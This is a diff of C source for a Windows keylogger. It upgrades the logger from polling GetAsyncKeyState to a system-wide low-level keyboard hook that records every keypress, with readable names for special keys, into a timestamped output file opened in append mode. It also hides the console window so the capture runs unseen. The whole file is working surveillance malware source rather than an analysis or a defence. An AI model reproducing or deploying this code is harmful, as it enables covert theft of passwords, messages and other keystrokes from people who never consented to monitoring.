@@ -1,108 +1,194 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <time.h>
+
 #include "keyLogger.h"
 
-/* A collection of the supported characters other than letters or numbers */
-key_t specialKeys[] = {
-    VK_BACK, VK_TAB, VK_SHIFT, VK_MENU, VK_CAPITAL, VK_PAUSE, VK_SPACE, VK_CONTROL, VK_RETURN
-};
+#define MAX_TIME_STR_LEN 30
 
-/* The number of the supported characters other than letters or numbers */
-size_t specialKeysSize = sizeof(specialKeys) / sizeof(key_t);
+#define VK_A 0x41
+#define VK_Z 0x5A
 
-key_t getCurrentKey(void)
+#define VK_0 0x30 
+#define VK_9 0x39
+
+HHOOK hKeyboardHook;
+
+FILE* outFile;
+
+
+void hideConsoleWindow(void)
 {
-    key_t i;
-    // Checks for the special keys
-    for (i = 0; i < (short)specialKeysSize; ++i)
-        if (GetAsyncKeyState(specialKeys[i])) return specialKeys[i];
-    // Checks for numbers
-    for (i = VK_0; i <= VK_9; ++i)
-        if (GetAsyncKeyState(i)) return i;
-    // Checks for letters
-    for (i = VK_A; i <= VK_Z; ++i)
-        if (GetAsyncKeyState(i)) return i;
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd != NULL) {
+        ShowWindow(hWnd, SW_HIDE);
+    }
+}
+
+
+void logToOutFile(const char* format, ...) {
+    va_list args;
+    va_start(args, format);
+
+    vfprintf_s(outFile, format, args);
+    fflush(outFile);
+
+    va_end(args);
+}
+
+
+void logCurrentTime(void)
+{
+    struct tm newtime;
+    time_t now = time(0);
+    localtime_s(&newtime, &now);
+
+    char timeString[MAX_TIME_STR_LEN];
+    asctime_s(timeString, sizeof timeString, &newtime);
+
+    logToOutFile("\n\nStart logging at: %s", timeString);
+}
+
+
+const char *getSpecialKeyName(DWORD vkCode) {
+    switch (vkCode) {
+    case VK_SHIFT:
+        return "SHIFT";
+    case VK_CONTROL:
+        return "CTRL";
+    case VK_MENU:
+        return "ALT";
+    case VK_LWIN:
+        return "LEFT WINDOWS";
+    case VK_RWIN:
+        return "RIGHT WINDOWS";
+    case VK_CAPITAL:
+        return "CAPS LOCK";
+    case VK_NUMLOCK:
+        return "NUM LOCK";
+    case VK_SCROLL:
+        return "SCROLL LOCK";
+    case VK_ESCAPE:
+        return "ESCAPE";
+    case VK_TAB:
+        return "TAB";
+    case VK_RETURN:
+        return "ENTER";
+    case VK_BACK:
+        return "BACKSPACE";
+    case VK_SPACE:
+        return "SPACE";
+    case VK_PRIOR:
+        return "PAGE UP";
+    case VK_NEXT:
+        return "PAGE DOWN";
+    case VK_END:
+        return "END";
+    case VK_HOME:
+        return "HOME";
+    case VK_INSERT:
+        return "INSERT";
+    case VK_DELETE:
+        return "DELETE";
+    case VK_PAUSE:
+        return "PAUSE";
+    case VK_PRINT:
+        return "PRINT SCREEN";
+    case VK_SNAPSHOT:
+        return "SNAPSHOT";
+    case VK_LEFT:
+        return "LEFT ARROW";
+    case VK_UP:
+        return "UP ARROW";
+    case VK_RIGHT:
+        return "RIGHT ARROW";
+    case VK_DOWN:
+        return "DOWN ARROW";
+
+    default:
+        return NULL; 
+    }
+}
+
+
+const char getCharFromVKCode(DWORD vkCode) {
+    if ((vkCode >= VK_A && vkCode <= VK_Z) ||
+        (vkCode >= VK_0 && vkCode <= VK_9)) 
+            return (char)vkCode;
+    
+    return '\0'; 
+}
+
+
+void logKey(const DWORD vkCode)
+{
+    char character = getCharFromVKCode(vkCode);
+    if (character) {
+        logToOutFile("%c", character);
+        return;
+    }
+
+    const char* specialKeyName = getSpecialKeyName(vkCode);
+    if (specialKeyName) {
+        logToOutFile("[%s]", specialKeyName);
+        return;
+    }
+    
+    logToOutFile("[%u]", vkCode);
+}
+
+
+LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0) {
+        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
+
+        if (wParam == WM_KEYDOWN) {
+            DWORD vkCode = kbStruct->vkCode;
+            logKey(vkCode);
+        }
+    }
+    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
+}
+
+
+const HHOOK setHook(void)
+{
+    return SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(NULL), 0);
+}
+
+
+errno_t setupKeyLogger(const char* outFileName) {
+    const errno_t fileErr = fopen_s(&outFile, outFileName, "a");
+    if (fileErr) return 1; // Cannot open file!
+
+    hKeyboardHook = setHook();
+    if (hKeyboardHook == NULL) return 1; // Cannot set hook!
 
     return 0;
 }
 
-void getKeyContext(const key_t key, char *context)
-{
-    const char *strContext = "ERROR";
-    switch (key)
-    {
-    case 0:
-        break;
-    case VK_BACK:
-        strContext = "[BACKSPACE]";
-        break;
-    case VK_TAB:
-        strContext = "[TAB]";
-        break;
-    case VK_CONTROL:
-        strContext = "[CTRL]";
-        break;
-    case VK_MENU:
-        strContext = "[ALT]";
-        break;
-    case VK_RETURN:
-        strContext = "[ENTER]";
-        break;
-    case VK_SHIFT:
-        strContext = "[SHIFT]";
-        break;
-    case VK_CAPITAL:
-        strContext = "[CAPS LOCK]";
-        break;
-    case VK_PAUSE:
-        strContext = "[PAUSE]";
-        break;
-    case VK_SPACE:
-        strContext = "[SPACE]";
-        break;
-    default:
-        // for unsupported keys
-        strContext = "[OTHER]";
-    }
-    strcpy_s(context, MAX_KEY_CONTEXT_LEN, strContext);
-}
 
-void writeKey(const key_t key, FILE *f)
+void startLogging(void)
 {
-    const BOOL isLetter = key <= VK_Z && key >= VK_A;
-    const BOOL isNumber = key <= VK_9 && key >= VK_0;
-    if (isLetter || isNumber)
-        fprintf(f, "%c", (char)key);
-    else
-    {
-        char *returnedStr = (char*)malloc(MAX_KEY_CONTEXT_LEN);
-        getKeyContext(key, returnedStr);
-        fprintf(f, "%s", returnedStr);
-        free(returnedStr);
+    logCurrentTime();
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
     }
 }
 
-errno_t logKeys(const char *outFileName, const size_t maximumKeys)
-{
-    FILE *outFile;
-    const errno_t fileErr = fopen_s(&outFile, outFileName, "w");
-    if (!fileErr)
-    {
-        size_t numOfKeys = 0;
-        while (numOfKeys < maximumKeys)
-        {
-            Sleep(INTERVAL);
-            const key_t currentKey = getCurrentKey();
-            if (currentKey)
-            {
-                writeKey(currentKey, outFile);
-                numOfKeys++;
-            }
-        }
-        fclose(outFile);
-    }
-    return fileErr;
-}
 
-void hideConsoleWindow(void)
+errno_t logKeys(const char *outFileName)
 {
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    errno_t err = setupKeyLogger(outFileName);
+    if (err) return err;
+
+    startLogging();
+
+    UnhookWindowsHookEx(hKeyboardHook); 
+    fclose(outFile);
+
+    return 0;
 }
